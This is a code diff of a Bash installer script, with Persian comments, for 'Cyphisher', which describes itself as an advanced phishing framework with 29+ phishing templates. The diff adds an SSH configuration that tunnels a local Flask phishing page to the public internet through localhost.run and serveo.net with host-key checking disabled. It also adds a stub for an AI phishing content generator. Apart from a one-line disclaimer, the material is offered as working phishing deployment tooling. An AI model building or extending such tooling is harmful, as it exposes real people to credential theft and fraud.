@@ -76,7 +76,7 @@ install_dependencies() {
     
     if [ "$IS_TERMUX" -eq 1 ]; then
         pkg update -y
-        pkg install -y python git curl wget unzip openssl-tool -y
+        pkg install -y python git curl wget unzip openssl-tool openssh -y
     fi
     
     log "✅ Dependencies installed"
@@ -190,7 +190,162 @@ create_directories() {
     touch "collected_data/all_devices.json"
     touch "phone_data/numbers.txt"
     
+    # ایجاد فایل‌های اولیه برای Pages
+    create_default_pages
+    
     log "✅ Directories created"
+}
+
+# ایجاد صفحات پیش‌فرض
+create_default_pages() {
+    log "📄 Creating default page files..."
+    
+    # ایجاد __init__.py برای Pages
+    cat > Pages/__init__.py << 'EOF'
+# Pages package
+EOF
+
+    # ایجاد یک صفحه نمونه
+    cat > Pages/sample.py << 'EOF'
+from flask import Flask, render_template, request
+import os
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '''
+    <html>
+    <head><title>Sample Page</title></head>
+    <body>
+        <h1>Welcome to Cyphisher</h1>
+        <p>This is a sample phishing page</p>
+    </body>
+    </html>
+    '''
+
+def run():
+    app.run(host='0.0.0.0', port=5001, debug=False)
+EOF
+
+    # ایجاد صفحه درباره ما
+    mkdir -p ABOUT
+    cat > ABOUT/About.py << 'EOF'
+from rich.console import Console
+from rich.panel import Panel
+
+console = Console()
+
+def run():
+    console.print(Panel.fit(
+        "[bold cyan]Cyphisher - Advanced Phishing Framework[/bold cyan]\n\n"
+        "[bold yellow]Features:[/bold yellow]\n"
+        "• 29+ Phishing Templates\n"
+        "• Multiple Tunnel Services\n"
+        "• Educational Purpose Only\n\n"
+        "[bold red]Warning:[/bold red] For authorized testing only!",
+        title="About Cyphisher",
+        border_style="green"
+    ))
+EOF
+
+    # ایجاد صفحه AI
+    mkdir -p AI
+    cat > AI/Test.py << 'EOF'
+from rich.console import Console
+from rich.panel import Panel
+
+console = Console()
+
+def main_interactive():
+    console.print(Panel.fit(
+        "[bold magenta]AI Phishing Content Generator[/bold magenta]\n\n"
+        "This feature generates phishing content using AI.\n"
+        "Currently in development...",
+        title="AI Content Generator",
+        border_style="magenta"
+    ))
+EOF
+
+    log "✅ Default pages created"
+}
+
+# تنظیم SSH برای localhost.run
+setup_ssh() {
+    log "🔑 Setting up SSH for localhost.run..."
+    
+    # ایجاد کلید SSH اگر وجود ندارد
+    if [ ! -f ~/.ssh/id_rsa ]; then
+        mkdir -p ~/.ssh
+        ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
+        log "✅ SSH key generated"
+    fi
+    
+    # تنظیم config برای localhost.run
+    cat > ~/.ssh/config << 'EOF'
+Host localhost.run
+    HostName localhost.run
+    RemoteForward 80 localhost:5001
+    ServerAliveInterval 60
+    ServerAliveCountMax 10
+    ExitOnForwardFailure yes
+    StrictHostKeyChecking no
+
+Host serveo.net
+    HostName serveo.net
+    RemoteForward 80 localhost:5001
+    ServerAliveInterval 60
+    ServerAliveCountMax 10
+    ExitOnForwardFailure yes
+    StrictHostKeyChecking no
+EOF
+
+    chmod 600 ~/.ssh/config
+    log "✅ SSH configured for localhost.run and serveo.net"
+}
+
+# تست اتصال اینترنت
+test_internet() {
+    log "🌐 Testing internet connection..."
+    
+    if ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; then
+        log "✅ Internet connection: OK"
+        return 0
+    else
+        log "⚠️ Internet connection: Slow or unavailable"
+        return 1
+    fi
+}
+
+# نمایش اطلاعات نصب
+show_installation_info() {
+    log "==========================================="
+    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
+    log "==========================================="
+    log "Platform: Termux ($ARCH)"
+    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
+    log "Virtual Environment: $VENV_DIR"
+    log "Port: $PORT"
+    log "Primary Tunnel: localhost.run (Free)"
+    log "Secondary Tunnel: serveo.net (Free)" 
+    log "Fallback Tunnel: Ngrok (Optional)"
+    log "SSH: Configured for localhost.run"
+    log ""
+    log "🚀 Features:"
+    log "   • 29+ Phishing Templates"
+    log "   • Auto Tunnel Selection"
+    log "   • No External Dependencies Required"
+    log "   • Works Offline After Setup"
+    log ""
+    log "📝 Usage:"
+    log "   The script will automatically use:"
+    log "   1. localhost.run (Primary)"
+    log "   2. serveo.net (Secondary)" 
+    log "   3. Ngrok (If installed and available)"
+    log ""
+    log "⚠️  Note: First run may take 20-30 seconds"
+    log "    as tunnels establish connection."
+    log "==========================================="
 }
 
 # تابع اصلی
@@ -204,48 +359,64 @@ main() {
         exit 1
     fi
     
+    # تست اینترنت
+    if ! test_internet; then
+        log "⚠️  No internet connection detected"
+        log "📡 Some features may not work without internet"
+        sleep 2
+    fi
+    
     fix_system_issues
     cleanup_old_ngrok
     install_dependencies
     setup_python_env
     
-    # نصب tunnel services
+    # تنظیم SSH (ضروری برای localhost.run)
+    setup_ssh
+    
+    # نصب tunnel services (اختیاری)
     if [ "$AUTO_NGROK" = "1" ]; then
-        if ! install_ngrok; then
-            log "⚠️ Ngrok installation failed"
+        if install_ngrok; then
+            log "✅ Ngrok installed as fallback"
+        else
+            log "⚠️ Ngrok installation skipped (optional)"
         fi
     fi
     
-    if ! install_cloudflared; then
-        log "⚠️ Cloudflared installation failed"
+    # نصب cloudflared (اختیاری)
+    if install_cloudflared; then
+        log "✅ Cloudflared installed as fallback"
+    else
+        log "⚠️ Cloudflared installation skipped (optional)"
     fi
     
     create_directories
     
-    log "==========================================="
-    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
-    log "==========================================="
-    log "Platform: Termux ($ARCH)"
-    log "Python: $(python --version 2>/dev/null)"
-    log "Virtual Environment: $VENV_DIR"
-    log "Port: $PORT"
-    log "Ngrok: $([ -f "${NGROK_DIR}/ngrok" ] && echo 'Installed' || echo 'Not available')"
-    log "Cloudflared: $([ -f "cloud_flare/cloudflared" ] && echo 'Installed' || echo 'Not available')"
+    # نمایش اطلاعات نصب
+    show_installation_info
     
-    log "🚀 Starting application in 3 seconds..."
-    sleep 3
+    log "🚀 Starting application in 5 seconds..."
+    sleep 5
     
     if [ -f "${VENV_DIR}/bin/python" ]; then
         clear
         log "🏁 Launching Cyphisher..."
+        
+        # تنظیم متغیرهای محیطی
         export PATH="$(pwd)/${NGROK_DIR}:$(pwd)/cloud_flare:$PATH"
         export PYTHONPATH="$(pwd)"
+        export CYPHISHER_AUTO_TUNNEL="true"
+        
+        # اجرای برنامه
         exec "${VENV_DIR}/bin/python" "$APP_FILE"
     else
         error "Python binary not found"
         exit 1
     fi
 }
+
+# هندل کردن سیگنال‌ها
+trap 'error "Setup interrupted"; exit 1' INT TERM
 
 # اجرای اسکریپت
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
